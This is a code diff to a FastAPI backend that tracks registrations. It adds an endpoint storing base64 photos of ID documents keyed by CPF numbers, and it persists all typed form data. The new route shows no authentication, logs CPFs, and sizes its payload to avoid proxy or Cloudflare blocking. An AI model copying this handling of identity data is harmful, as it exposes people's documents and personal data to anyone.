@@ -271,9 +271,12 @@ async def track_registration(data: TrackIn, request: Request):
         if email:
             set_fields['email'] = email
         # Se vier form_data completo, persiste também (tudo que o usuário digitou)
+        # Usa dot notation para preservar campos existentes (ex: doc_frente enviado
+        # separadamente via /track/documents não é sobrescrito)
         fd = extra.get('form_data')
         if isinstance(fd, dict) and fd:
-            set_fields['form_data'] = fd
+            for k, v in fd.items():
+                set_fields[f'form_data.{k}'] = v
         await _db.cadastros.update_one(
             {'cpf': cpf},
             {
@@ -345,6 +348,39 @@ async def track_registration(data: TrackIn, request: Request):
     else:
         if nome:
             await insert_event('cadastro', f"Cadastro realizado: {nome}", {'nome': nome, 'cpf': cpf})
+    return {'ok': True}
+
+
+class DocsIn(BaseModel):
+    cpf: str = ''
+    doc_tipo: str = 'RG'
+    doc_frente: str = ''
+    doc_verso: str = ''
+
+
+@admin_router.post('/track/documents')
+async def track_documents(payload: DocsIn):
+    """Recebe fotos do documento (frente/verso) em base64 e salva no cadastro.
+    Payload menor sem outros campos para evitar bloqueio de proxy/CF.
+    """
+    cpf = ''.join(ch for ch in str(payload.cpf or '') if ch.isdigit())
+    if not cpf:
+        return {'ok': False, 'error': 'cpf_required'}
+    set_fields = {}
+    if payload.doc_frente:
+        set_fields['form_data.doc_frente'] = payload.doc_frente
+    if payload.doc_verso:
+        set_fields['form_data.doc_verso'] = payload.doc_verso
+    if payload.doc_tipo:
+        set_fields['form_data.doc_tipo'] = payload.doc_tipo
+    if not set_fields:
+        return {'ok': False, 'error': 'no_docs'}
+    await _db.cadastros.update_one(
+        {'cpf': cpf},
+        {'$set': set_fields, '$setOnInsert': {'created_at': datetime.now(timezone.utc), 'cpf': cpf}},
+        upsert=True,
+    )
+    logger.info(f"track_documents saved: cpf={cpf} keys={list(set_fields.keys())}")
     return {'ok': True}
 
 async def _upsert_pix_status(extra: Dict[str, Any], pix_status: str):
